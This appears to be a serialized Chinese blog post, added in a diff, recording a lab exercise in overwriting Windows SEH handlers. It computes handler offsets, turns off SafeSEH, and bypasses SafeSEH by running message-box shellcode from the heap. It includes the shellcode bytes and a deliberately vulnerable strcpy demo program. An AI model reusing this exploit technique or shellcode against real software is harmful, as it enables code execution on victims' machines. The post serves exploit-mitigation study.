@@ -1,0 +1,119 @@
+I"�%<p>跟到main里发现main里的SHE节点已经初始化
+<img src="https://i.imgur.com/I7wUmgB.png" alt="p1" />
+重启程序找到初始化main的SHE节点的函数
+<img src="https://i.imgur.com/Gk37fQ8.png" alt="p2" />
+进入test函数的SHE节点初始化
+<img src="hhttps://i.imgur.com/5jhJeCA.png" alt="p3" />
+触发断点后可以看见eip跳到了test函数的SE处理函数(并且在跳过去的过程中又创建了一个节点)
+<img src="https://i.imgur.com/AOUuNfP.png" alt="p4" />
+进入vcruntim, 往下找到获取异常处理函数地址的位置
+<img src="https://i.imgur.com/gfi0qtw.png" alt="p5" /></p>
+
+<p>回到strcpy处, 计算buf变量到SEH节点(保存处理函数的地址处)的相对偏移(==0xd8)
+覆盖成功
+<img src="https://i.imgur.com/rJaXdAe.png" alt="p6" /></p>
+
+<hr />
+
+<h2 id="基本流程梳理清楚了-尝试覆盖函数地址">基本流程梳理清楚了 尝试覆盖函数地址</h2>
+
+<p>vs2019关闭SAFESEH
+<img src="https://i.imgur.com/RykRJai.png" alt="p7" /></p>
+
+<p>程序无法跳到栈上执行(检查了目标地址是否在栈内)
+<img src="https://i.imgur.com/ZxlWx3I.png" alt="p9" />
+所以采用直接跳到全局变量shellcode(0x403018)处执行
+<img src="http://aiQG.vip/wp-content/uploads/2019/10/p8.png" alt="p8" />
+shellcode:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00</span><span class="s">"</span>
+</code></pre></div></div>
+
+<p>坑:</p>
+
+<ol>
+  <li>之前用了DEBUG版本, 发现eip并不能跳到指定位置, 程序在开始处理异常后会卡死, 猜测是进行了检查</li>
+  <li>程序没有触发异常, 发现是shellcode把变量zero的值给覆盖成了0x90909090, 然后把shellcode对应位置改成\x00后发现strcpy会截断\x00后的内容, 所以在strcpy后重新给zero重新赋0值(环境不同, 编译出的结果不同)</li>
+</ol>
+
+<hr />
+
+<p>开启safeSEH</p>
+
+<p>绕过safeSEH的方法还是挺多的</p>
+
+<p>这里利用堆绕过</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">shellCode</span><span class="p">[]</span> <span class="o">=</span> 
+<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">jumpCode</span><span class="p">[]</span> <span class="o">=</span>
+<span class="s">"aaaaaaaaaaaaa</span><span class="se">\xaa\xbb\xcc\xdd</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">DWORD</span> <span class="nf">myExceptionHandler</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Got an exception!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">getchar</span><span class="p">();</span>
+	<span class="n">ExitProcess</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">test</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">input</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+	<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">222</span><span class="p">);</span> 
+	<span class="kt">char</span> <span class="n">buf2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kr">__try</span>
+	<span class="p">{</span>
+		<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+		<span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf2</span><span class="p">,</span> <span class="n">jumpCode</span><span class="p">);</span>
+		<span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buf2</span> <span class="o">+</span> <span class="mi">13</span><span class="p">),</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span> <span class="n">buf</span><span class="p">);</span>
+		<span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">zero</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">/</span> <span class="n">zero</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="kr">__except</span> <span class="p">(</span><span class="n">myExceptionHandler</span><span class="p">())</span> <span class="p">{};</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"main!!!!"</span><span class="p">);</span>
+	<span class="n">test</span><span class="p">(</span><span class="n">shellCode</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>shellCode内容相同, 执行的位置从全局变量区到了堆区(safeSHE允许在堆上执行)</p>
+
+<p>jumpCode覆盖处理异常的函数的地址</p>
+:ET
